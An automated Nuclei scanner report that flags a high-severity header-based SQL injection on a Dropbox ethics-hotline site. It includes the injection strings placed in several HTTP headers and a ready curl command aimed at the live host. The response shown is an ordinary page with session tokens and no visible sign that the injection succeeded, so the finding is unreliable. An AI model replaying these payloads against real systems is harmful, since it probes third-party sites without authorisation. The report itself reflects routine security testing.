### Request header based sqli (header-sqli) found on https://integrity.dropbox.com

----
**Details**: **header-sqli** matched at https://integrity.dropbox.com

**Protocol**: HTTP

**Full URL**: https://app.convercent.com/en-us/LandingPage/a69a789e-c300-e511-8123-00155d621509

**Timestamp**: Sat Dec 9 14:39:13 +0000 UTC 2023

**Template Information**

| Key | Value |
| --- | --- |
| Name | Request header based sqli |
| Authors | panch0r3d |
| Tags |  |
| Severity | high |

**Request**
```http
GET / HTTP/1.1
Host: integrity.dropbox.com
User-Agent: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'
Connection: close
Accept: */*
Accept-Language: en
Cookie: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'
Referer: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'
X-Forwarded-For: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 200 OK
Connection: close
Cache-Control: private
Content-Type: text/html; charset=utf-8
Date: Sat, 09 Dec 2023 14:39:13 GMT
Set-Cookie: ApplicationGatewayAffinityCORS=3d531374068dee3419daef94f358a167; Path=/; SameSite=None; Secure
Set-Cookie: ApplicationGatewayAffinity=3d531374068dee3419daef94f358a167; Path=/
Set-Cookie: ASP.NET_SessionId=ansjpimsaivtu1yu3ybpfskj; path=/; secure; HttpOnly; SameSite=Lax
Set-Cookie: ASP.NET_SessionId=ansjpimsaivtu1yu3ybpfskj; path=/; secure; HttpOnly; SameSite=Lax
Set-Cookie: __RequestVerificationToken=8yX_RK6Wx5k4BOpdA7aKENEG5QJMwodXtmj8paqnH9ZsL5A_zmfvt3BpLjpnfE74rWlU5jR0esfJGrmjyk5zQ6FSds0x9Fnk6qO1Cmez98k1; path=/; secure; HttpOnly
Strict-Transport-Security: max-age=86400;includeSubDomains
Vary: Accept-Encoding
X-Frame-Options: SAMEORIGIN
X-Frame-Options: SAMEORIGIN
X-Ua-Compatible: IE=Edge



<!DOCTYPE html>
<html lang="en">
<head "">
	
<!-- OneTrust Cookies Consent Notice start -->
<script src="https://cdn.cookielaw.org/scripttemplates/otSDKStub.js" data-document-language="true" type="text/javascript" charset="UTF-8" data-domain-script="303afb82-bcff-4a9c-a161-ee881fe4485e"></script>
<script type="text/javascript">
	function OptanonWrapper() { }
</script>
<!-- OneTrust Cookies Consent Notice end -->

	<title>Dropbox Ethics &amp; Compliance Hotline - Powered by Convercent</title>
	<meta charset="utf-8" />
<meta http-equiv="pragma" content="no-cache" />
<meta http-equiv="expires" content="12/9/2022 2:39:13 PM" />
<meta http-equiv="cache-control" content="private, max-age=1, no-cache, must-revalidate, proxy-revalidate, no-transform" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, shrink-to-fit=no, viewport-fit=cover" />
<meta name="description" content="" />
<meta name="author" content="" />
<meta name="robots" content="noindex" />
<meta name="msapplication-TileColor" content="#FFFFFF" />
<meta name="msapplication-TileImage" content="/Themes/Convercent/Images/tileicon.png" />
<meta name="msapplication-navbutton-color" content="#7b2881" />
<meta name="application-name" content="Convercent" />
<link rel="shortcut icon" href="/Themes/Convercent/Images/favicon.ico" type="image/x-icon" />


	<link href="/bundles_anonymous/themes/?v=w16kdNzi39CnnzJYB08a3UeCfDSwu_BL_CxPqZZ503s1" rel="stylesheet"/>

	<link href="/bundles_anonymous/custom/?v=mSAXkfD1PW__lhDL3pBrsSMQlrUYGWvctvVepDgISwE1" rel="stylesheet"/>


	<link href="/Themes/Convercent/Styles/Fonts/glyph-icons.css" rel="stylesheet" />
	<link href="/Areas/Darwin/Themes/Convercent/CSS/glyph-icon-extensions.css" rel="stylesheet" />

	<!--[if lt IE 9]>
		<script src="/Scripts/lib/html5.js"></script>
	<![endif]-->
	<script src="/bundles_anonymous/scripts/?v=d9GkALuaywWs3wbuWVkzf_Q4bOC4Yh-Mw0naK9fHKLQ1"></script>


	

</head>
<body>
	<input name="__RequestVerificationToken" type="hidden" value="UsV49JjLTdSnFMuw6VRpfJguI5d8FzhH6FtztO_sO-xHyqA1-TWDtmkVb-gtWWm4Sp12rZvyQFM2fnh9W-Oakw_R4bln5C3Nio-56SwrYfk1" />
	

<link rel="stylesheet" href="/Themes/Convercent/Styles/Modules/ActionRow/ActionRow.css"/>
<link rel="stylesheet" href="/Themes/Convercent/Styles/landingPage/landingPage.css"/>

<div class="l-top">
	<div class="l-containter">
		<div class="translation cf">


<link href="/Areas/Anonymous/Themes/Convercent/_landingPageLanguageMenu.css" rel="stylesheet" />

<div class="dropdown control-group langsel pull-right">
	<div style="position: relative">
		<a class="dropdown-toggle" dir="ltr" href="#" id="selectedlangelement">
			<span id="font-icon" class="icon-Globe" style="all: initial; color:#007573; font-size: 16px; vertical-align: baseline;"></span>
			<span class="langsel-culture">
				English (United States)
			</span>
			<span class="caret"></span>
		</a>
		<div class="language-menu">
			<ul class="pull-right" id="languageslist">
					<li>
						<a href="/af-za/Anonymous/IssueIntake/LandingPage/a69a789e-c300-e511-8123-00155d621509">
							<span class="langsel-culture">
								<span dir="auto">Afrikaans (Suid-Afrika)</span>
							</span>
						</a>
					</li>
					<li>
						<a href="/ms-my/Anonymous/IssueIntake/LandingPage/a69a789e-c300-e511-8123-00155d621509">
							<span class="langsel-culture">
								<span dir="auto">Bahasa Melayu (Malaysia)</span>
							</span>
						</a>
					</li>
					<li>
						<a href="/cs-cz/Anonymous/IssueIntake/LandingPage/a69a789e-c300-e511-8123-00155d621509">
							<span class="langsel-culture">
								<span dir="auto">čeština (Česká republika)</span>
							</span>
						</a>
					</li>
					<li>
						<a href="/da-dk/Anonymous/IssueIntake/LandingPage/a69a789e-c300-e511-8123-00155d621509">
							<span class="langsel-culture">
								<span dir="auto">dansk (Danmark)</span>
							</span>
						</a>
					</li>
					<li>
						<a href="/de-de/Anonymous/IssueIntake/LandingPage/a69a789e-c300-e511-8123-00155d621509">
							<span class="langsel-culture">
								<span dir="auto">Deutsch (Deutschland)</span>
							</span>
						</a>
					</li>.... Truncated ....
```


**CURL command**
```sh
curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '\''%1'\''' -H 'Referer: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '\''%1'\''' -H 'User-Agent: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '\''%1'\''' -H 'X-Forwarded-For: -1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '\''%1'\''' 'https://integrity.dropbox.com/'
```

----

Generated by [Nuclei v3.1.0-dev](https://github.com/projectdiscovery/nuclei)